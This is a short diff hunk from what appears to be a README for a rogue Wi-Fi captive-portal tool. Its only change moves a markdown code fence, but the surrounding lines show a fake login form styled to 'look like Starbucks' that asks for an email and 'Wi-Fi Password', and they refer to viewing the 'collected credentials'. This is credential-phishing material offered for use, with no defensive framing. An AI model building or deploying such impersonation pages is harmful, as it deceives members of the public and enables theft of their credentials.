@@ -130,7 +130,8 @@ Wanna make it look like Starbucks? Just change the login.html body like this
   <input type="text" name="username" placeholder="Email"><br>
   <input type="password" name="password" placeholder="Wi-Fi Password"><br>
   <input type="submit" value="Connect">
-</form>```
+</form>
+```
 
 You can view your collected credentials in:
 
